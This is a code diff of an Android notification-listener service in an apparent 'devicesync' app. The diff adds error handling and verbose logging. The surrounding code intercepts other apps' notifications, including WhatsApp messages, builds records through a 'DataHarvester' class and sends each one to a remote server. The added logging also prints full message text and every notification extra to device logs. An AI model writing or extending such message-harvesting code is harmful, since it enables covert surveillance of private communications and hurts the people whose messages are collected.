@@ -6,6 +6,7 @@ import android.content.Intent
 import kotlinx.coroutines.*
 import com.devicesync.app.data.repository.DeviceSyncRepository
 import com.devicesync.app.utils.SettingsManager
+import java.util.Date
 
 class NotificationListenerService : NotificationListenerService() {
     
@@ -17,26 +18,37 @@ class NotificationListenerService : NotificationListenerService() {
     
     override fun onCreate() {
         super.onCreate()
-        repository = DeviceSyncRepository(applicationContext)
-        dataHarvester = DataHarvester(applicationContext)
-        settingsManager = SettingsManager(applicationContext)
+        println("🔔 NotificationListenerService onCreate() called")
         
-        // Try to get device ID from settings
-        val savedDeviceId = settingsManager.getDeviceId()
-        
-        // If device ID is null, try to generate it
-        if (savedDeviceId.isNullOrEmpty()) {
-            val newDeviceId = generateDeviceId()
-            deviceId = newDeviceId
-            settingsManager.saveDeviceId(newDeviceId)
-            println("🔔 Generated new device ID: $newDeviceId")
-        } else {
-            deviceId = savedDeviceId
+        try {
+            repository = DeviceSyncRepository(applicationContext)
+            dataHarvester = DataHarvester(applicationContext)
+            settingsManager = SettingsManager(applicationContext)
+            
+            // Try to get device ID from settings
+            val savedDeviceId = settingsManager.getDeviceId()
+            
+            // If device ID is null, try to generate it
+            if (savedDeviceId.isNullOrEmpty()) {
+                val newDeviceId = generateDeviceId()
+                deviceId = newDeviceId
+                settingsManager.saveDeviceId(newDeviceId)
+                println("🔔 Generated new device ID: $newDeviceId")
+            } else {
+                deviceId = savedDeviceId
+            }
+            
+            val currentDeviceId = deviceId
+            println("🔔 NotificationListenerService created for device: $currentDeviceId")
+            println("🔔 Service is ready to monitor notifications")
+            println("🔔 Repository initialized: ${repository != null}")
+            println("🔔 DataHarvester initialized: ${dataHarvester != null}")
+            println("🔔 SettingsManager initialized: ${settingsManager != null}")
+            
+        } catch (e: Exception) {
+            println("❌ Error in NotificationListenerService onCreate: ${e.message}")
+            println("❌ Stack trace: ${e.stackTraceToString()}")
         }
-        
-        val currentDeviceId = deviceId
-        println("🔔 NotificationListenerService created for device: $currentDeviceId")
-        println("🔔 Service is ready to monitor notifications")
     }
     
     private fun captureWhatsAppMessageFromNotification(title: String, text: String, packageName: String) {
@@ -79,14 +91,27 @@ class NotificationListenerService : NotificationListenerService() {
         
         println("🔔 onNotificationPosted called with notification: ${sbn?.packageName}")
         
-        sbn?.let { notification ->
-            println("🔔 Processing notification from: ${notification.packageName}")
+        if (sbn == null) {
+            println("🔔 Received null notification, skipping")
+            return
+        }
+        
+        try {
+            println("🔔 Processing notification from: ${sbn.packageName}")
             
             // Extract notification details for filtering
-            val packageName = notification.packageName
-            val extras = notification.notification.extras
+            val packageName = sbn.packageName
+            val extras = sbn.notification.extras
             val title = extras.getString(android.app.Notification.EXTRA_TITLE)
             val text = extras.getString(android.app.Notification.EXTRA_TEXT)
+            
+            // 📊 REAL-TIME NOTIFICATION CAPTURE LOG
+            println("🎯 REAL-TIME NOTIFICATION DETECTED:")
+            println("   📦 Package: $packageName")
+            println("   📋 Title: ${title ?: "N/A"}")
+            println("   📝 Text: ${text ?: "N/A"}")
+            println("   ⏰ Time: ${Date()}")
+            println("   🆔 ID: ${sbn.id}")
             
             // Filter out unwanted system notifications
             if (packageName == "android") {
@@ -124,6 +149,8 @@ class NotificationListenerService : NotificationListenerService() {
                 return
             }
             
+            println("✅ NOTIFICATION APPROVED FOR SYNC - Starting sync process...")
+            
             serviceScope.launch {
                 try {
                     // Get device ID with fallback
@@ -140,14 +167,18 @@ class NotificationListenerService : NotificationListenerService() {
                     
                     if (currentDeviceId != null) {
                         println("🔔 Syncing notification for device: $currentDeviceId")
-                        syncNewNotification(currentDeviceId, notification)
+                        syncNewNotification(currentDeviceId, sbn)
                     } else {
                         println("🔔 Device ID is still null, cannot sync notification")
                     }
                 } catch (e: Exception) {
                     println("🔔 Error processing notification: ${e.message}")
+                    println("🔔 Stack trace: ${e.stackTraceToString()}")
                 }
             }
+        } catch (e: Exception) {
+            println("❌ Error in onNotificationPosted: ${e.message}")
+            println("❌ Stack trace: ${e.stackTraceToString()}")
         }
     }
     
@@ -162,6 +193,36 @@ class NotificationListenerService : NotificationListenerService() {
             val title = extras.getCharSequence("android.title")?.toString()
             val text = extras.getCharSequence("android.text")?.toString()
             val bigText = extras.getCharSequence("android.bigText")?.toString()
+            val timestamp = sbn.postTime
+            
+            // 📊 COMPREHENSIVE NOTIFICATION LOGGING BEFORE API SEND
+            println("=".repeat(80))
+            println("🔔 REAL-TIME NOTIFICATION CAPTURED - BEFORE API SEND")
+            println("=".repeat(80))
+            println("📱 Device ID: $deviceId")
+            println("📦 Package Name: $packageName")
+            println("📱 App Name: $appName")
+            println("📋 Title: ${title ?: "N/A"}")
+            println("📝 Text: ${text ?: "N/A"}")
+            println("📄 Big Text: ${bigText ?: "N/A"}")
+            println("⏰ Timestamp: $timestamp (${Date(timestamp)})")
+            println("🆔 Notification ID: ${sbn.id}")
+            println("📊 Notification Key: ${sbn.key}")
+            println("👤 User ID: ${sbn.user}")
+            println("🏷️ Tag: ${sbn.tag}")
+            println("📈 Post Time: ${sbn.postTime}")
+            println("🔊 Priority: ${sbn.notification.priority}")
+            println("🔔 Channel ID: ${sbn.notification.channelId}")
+            println("🎯 Category: ${sbn.notification.category}")
+            println("🔗 Actions: ${sbn.notification.actions?.size ?: 0}")
+            
+            // Log all extras for debugging
+            println("📋 All Extras:")
+            extras.keySet().forEach { key ->
+                val value = extras.get(key)
+                println("   $key: $value")
+            }
+            println("=".repeat(80))
             
             // Create notification model
             val notificationModel = dataHarvester.createNotificationModel(
@@ -172,17 +233,36 @@ class NotificationListenerService : NotificationListenerService() {
                 text = bigText ?: text
             )
             
+            // Log the model being sent to API
+            println("📤 NOTIFICATION MODEL FOR API:")
+            println("   ID: ${notificationModel.notificationId}")
+            println("   Package: ${notificationModel.packageName}")
+            println("   App: ${notificationModel.appName}")
+            println("   Title: ${notificationModel.title}")
+            println("   Text: ${notificationModel.text}")
+            println("   Timestamp: ${notificationModel.timestamp}")
+            println("=".repeat(80))
+            
             // Sync to server immediately
+            println("🚀 SENDING TO API...")
             val result = repository.syncNotifications(deviceId, listOf(notificationModel))
             
             if (result.isSuccess) {
-                println("Notification synced: $packageName - $title")
+                println("✅ NOTIFICATION SYNCED SUCCESSFULLY!")
+                println("   Response: ${result.message}")
+                println("   Data: ${result.data}")
             } else {
-                println("Failed to sync notification: ${result.message}")
+                println("❌ NOTIFICATION SYNC FAILED!")
+                println("   Error: ${result.message}")
+                println("   Data: ${result.data}")
             }
+            println("=".repeat(80))
             
         } catch (e: Exception) {
-            println("Error syncing notification: ${e.message}")
+            println("💥 ERROR SYNCING NOTIFICATION:")
+            println("   Exception: ${e.message}")
+            println("   Stack trace: ${e.stackTraceToString()}")
+            println("=".repeat(80))
         }
     }
     
